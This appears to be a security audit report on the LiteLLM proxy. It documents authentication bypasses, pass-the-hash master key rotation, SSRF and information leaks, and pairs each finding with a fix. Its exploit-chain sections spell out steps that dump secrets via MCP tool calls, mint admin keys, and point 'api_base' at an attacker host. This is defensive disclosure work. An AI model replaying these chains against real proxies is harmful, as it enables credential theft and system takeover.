# LiteLLM Proxy — Security Audit Report

**Auditor:** [AutoFyn](https://github.com/SignalPilot-Labs/AutoFyn)
**Date:** 2026-04-21 | **Commit:** `b9bedc8153` on `litellm_internal_staging`
**Target:** LiteLLM proxy v1.83.10 (PostgreSQL 15 backend)
**Method:** Automated code analysis + live exploitation with Claude Code
**Audit repo:** https://github.com/tempcollab/litellm

This report consolidates two audit rounds. Round 1 (v1) focused on authentication and authorization flaws in core proxy endpoints. Round 2 (v2) expanded to MCP server integration, spend/financial endpoints, and SSRF. All findings were live-confirmed against a running proxy instance.

Reproduce: `./tests/autofyn_audit/v1/run_live_tests.sh` (v1) and `./tests/autofyn_audit/v2/run_live_tests.sh` (v2).

---

## Summary of Findings

| ID | Title | Severity | Source | Prerequisites |
|---|---|---|---|---|
| CHAIN-B-RCE | Zero-auth MCP bypass → full RCE | Critical | v2 | MCP server with `allow_all_keys: true` |
| CHAIN-1 | `/metrics` + pass-the-hash → proxy takeover | Critical | v1 | Prometheus on, metrics auth off, `internal_user` key |
| A-1/A-2 | MCP auth bypass → unauthenticated tool execution | Critical | v2 | MCP server with `allow_all_keys: true` |
| F-5 | `_is_master_key()` accepts hash → master key rotation | Critical | v1 | Master key hash + `internal_user` key |
| F-3 | Unauthenticated `/metrics/` leaks master key hash | High | v1 | Prometheus on, metrics auth off (default) |
| F-2 | `/spend/keys` returns all keys to any authenticated user | High | v1, v2 | `internal_user` or `internal_user_viewer` key |
| F-6 | MCP OAuth discovery SSRF | High | v1 | Admin registers attacker-influenced MCP server |
| SSRF | `api_base` SSRF via `check_complete_credentials` bypass | High | v2 | Any valid API key |
| B-4 | `/global/spend` readable by any authenticated user | High | v2 | Any valid API key |
| B-5 | `/global/spend/teams` readable by any authenticated user | High | v2 | Any valid API key |
| F-4 | Unauthenticated `/token` endpoint | Medium | v1 | Stored malicious `token_url` via F-6 |
| Stack | Error responses include full Python tracebacks | Medium | v2 | Any valid API key |
| F-1 | Unauthenticated `/debug/asyncio-tasks` | Low | v1, v2 | None |
| Header | `x-litellm-model-api-base` leaks backend URLs | Low | v2 | Any valid API key |

---

## Exploit Chains

### CHAIN-B-RCE: Zero-Credential MCP Auth Bypass → Full RCE (CVSS 10.0)

**Starting position:** Zero credentials
**Live result:** 5/5 steps confirmed

An unauthenticated attacker exploits the MCP OAuth2 header fallback to bypass authentication entirely, then leverages any shell/file MCP server (filesystem, terminal, code-interpreter) for full remote code execution.

```
1. POST /<mcp_server>/mcp with Authorization: Bearer <any-garbage-string>
   → user_api_key_auth raises 401 → caught at user_api_key_auth_mcp.py:136-142
   → UserAPIKeyAuth() (anonymous) substituted → allow_all_keys grants access

2. tools/list → attacker discovers run_command, read_file, list_directory

3. tools/call run_command {command: "env"}
   → dumps LITELLM_MASTER_KEY, DATABASE_URL, AWS_SECRET_ACCESS_KEY, etc.

4. tools/call read_file {path: "<proxy_config.yaml>"}
   → reads credential_list with provider API keys

5. POST /key/generate with stolen LITELLM_MASTER_KEY
   → attacker generates persistent admin API key
```

**Root cause:** `user_api_key_auth_mcp.py:127-153` — the OAuth2 header fallback catches 401/403 from `user_api_key_auth` and substitutes an empty `UserAPIKeyAuth()`. Any invalid bearer token bypasses authentication. Combined with `allow_all_keys: true`, the anonymous session gets full tool access.

**Impact:** Complete secret theft, persistent admin access, arbitrary command execution, lateral movement via DB credentials, and financial liability from stolen provider API keys.

### CHAIN-1: Proxy Takeover via `/metrics` + Pass-the-Hash

**Starting position:** `internal_user` API key + Prometheus enabled (default metrics auth off)
**Live result:** Full chain confirmed

```
1. Admin makes any request with master key → Prometheus labels record its SHA-256 hash
2. GET /metrics/ (no auth) → attacker extracts hashed_api_key="1c807cf78..."
3. POST /key/regenerate (Authorization: Bearer <internal_user_key>)
   Body: {"key": "<hash>", "new_master_key": "sk-attacker-value"}
   → 200 OK, master key rotated
```

**Root cause:** Two bugs combine. F-3: `/metrics/` is unauthenticated and embeds key hashes in labels. F-5: `_is_master_key()` in `spend_tracking_utils.py:55-69` compares against both plaintext and `hash_token()`, and `/key/regenerate` has no admin role check (`key_management_endpoints.py:3882-3939`).

### CHAIN-C: Low-Privilege User → Cross-Tenant Breach + SSRF (CVSS 7.7)

**Starting position:** One low-privilege `internal_user` API key
**Live result:** 5/6 steps confirmed

```
1. GET /global/spend → all-tenant financial data (no role check)
2. GET /global/spend/teams → per-team spend breakdowns (no role check)
3. GET /spend/keys → all API key hashes, user IDs, budgets, metadata
4. GET /global/spend/tags → error with traceback.format_exc(): file paths, DB details
5. POST /chat/completions → x-litellm-model-api-base header leaks backend URLs
6. POST /chat/completions with api_key="dummy", api_base="http://attacker.com"
   → check_complete_credentials accepts any non-empty api_key → SSRF
```

**Root cause:** Spend endpoints require authentication but have no role check. `check_complete_credentials` (`auth_utils.py:53-76`) accepts any non-empty string as `api_key`, bypassing the `api_base` ban.

---

## Individual Findings

### F-5: Pass-the-Hash Master Key Rotation — Critical (v1)

`spend_tracking_utils.py:55-69` — `_is_master_key()` accepts `hash_token(master_key)` as equivalent to the plaintext. `/key/regenerate` (`key_management_endpoints.py:3882-3939`) has no admin role check — any `internal_user` can rotate the master key.

**Fix:** Remove the hash comparison branch. Add `PROXY_ADMIN` role check before master key rotation.

### A-1/A-2: MCP Auth Bypass — Critical (v2)

`user_api_key_auth_mcp.py:127-153` — Invalid bearer token → `user_api_key_auth` raises 401 → caught → `UserAPIKeyAuth()` (anonymous) substituted. On `allow_all_keys: true` servers, this grants full tool access with zero valid credentials.

**Fix:** Remove the fallback that substitutes `UserAPIKeyAuth()` on auth failure. If the bearer token is not a valid LiteLLM key and not a valid OAuth2 token, reject the request.

### F-3: Unauthenticated `/metrics/` Leaks Master Key Hash — High (v1)

When Prometheus is enabled and `require_auth_for_metrics_endpoint` is unset (default), `/metrics/` is public. Labels include `hashed_api_key` — the SHA-256 of the caller's key for any request type.

**Fix:** Default `require_auth_for_metrics_endpoint` to `true`.

### F-2: `/spend/keys` Returns All Key Rows — High (v1, v2)

`spend_management_endpoints.py:34-66` — `spend_key_fn()` has no `user_api_key_dict` param, returns all keys unfiltered. Accessible to `internal_user` and `internal_user_viewer`. Exposes key hashes, names, user/team IDs, budgets, metadata.

**Fix:** Add `user_api_key_dict` dependency, filter by caller role/user.

### F-6: MCP OAuth Discovery SSRF — High (v1)

`mcp_server_manager.py:1481-1704` — When admin registers an MCP server with `auth_type: oauth2`, the proxy follows the `resource_metadata` URL from the `WWW-Authenticate` header with no private-IP or scheme validation.

**Fix:** Apply `IPAddressUtils` blocklist and enforce `https://`.

### SSRF via `api_base` — High (v2)

`auth_utils.py:53-76` — `check_complete_credentials` returns `True` for any non-empty `api_key` string including `"dummy"`, bypassing the `api_base` ban. The proxy creates `AsyncOpenAI(api_key="dummy", base_url=<attacker_url>)` and sends a request.

**Fix:** Validate `api_key` format — reject dummy values that don't match real key patterns.

### B-4/B-5: Global Spend Endpoints Missing Role Check — High (v2)

`/global/spend` and `/global/spend/teams` require authentication but do not verify admin privileges. Any authenticated user reads all-tenant financial data.

**Fix:** Add admin role check to both endpoints.

### F-4: Unauthenticated `/token` — Medium (v1)

`discoverable_endpoints.py:589` — Public endpoint (intentional for OAuth) POSTs to stored `token_url` without URL validation. Combined with F-6, enables SSRF relay.

**Fix:** Add URL validation to `exchange_token_with_server()`.

### Stack Trace Disclosure — Medium (v2)

`spend_management_endpoints.py:1427-1444` — Error handler uses `traceback.format_exc()` in HTTP responses, exposing file paths, Python version, package versions, and DB connection details.

**Fix:** Remove `traceback.format_exc()` from error responses.

### F-1: Unauthenticated `/debug/asyncio-tasks` — Low (v1, v2)

`debug_utils.py:53` — No `Depends(user_api_key_auth)`. Reveals DB type, alerting config, and monitoring tasks.

**Fix:** Add auth dependency.

### API Base Header Leak — Low (v2)

`x-litellm-model-api-base` response header on `/chat/completions` exposes backend provider URLs (Azure resource names, internal hostnames) unconditionally.

**Fix:** Gate the header to admin callers only.

---

## Fix Priority

| Priority | Fix | Chains Eliminated | Effort |
|---|---|---|---|
| P0 | Remove MCP OAuth2 fallback — require valid key on all MCP routes | CHAIN-B-RCE | Low |
| P0 | Remove hash branch from `_is_master_key()` | CHAIN-1 | 1 line |
| P0 | Default metrics auth to `true` | CHAIN-1 | Config default |
| P0 | Validate `api_key` format in `check_complete_credentials` | CHAIN-C SSRF | Medium |
| P0 | Remove `traceback.format_exc()` from HTTP error responses | CHAIN-C info leak | Low |
| P1 | Add admin role check to `/global/spend*` endpoints | CHAIN-C Steps 1-2 | Low |
| P1 | Filter `/spend/keys` by caller role/user_id | CHAIN-C Step 3, F-2 | Low |
| P1 | Apply IP blocklist to MCP OAuth discovery | F-6 | Medium |
| P1 | Gate `x-litellm-model-api-base` header to admin callers | CHAIN-C Step 5 | Trivial |
| P2 | Validate `/token` relay URL | F-4 | Medium |
| P2 | URL scheme + private-IP validation on `api_base` | Defense-in-depth | Medium |
| P3 | Add auth to `/debug/asyncio-tasks` | F-1 | Trivial |

---

## Audit Files

All supporting materials (exploit scripts, test configs, reproduction instructions) are organized by round:

- `v1/` — Round 1 audit: `/metrics` chain, pass-the-hash, SSRF, info disclosure
- `v2/` — Round 2 audit: MCP auth bypass, RCE chains, spend endpoint leaks, SSRF
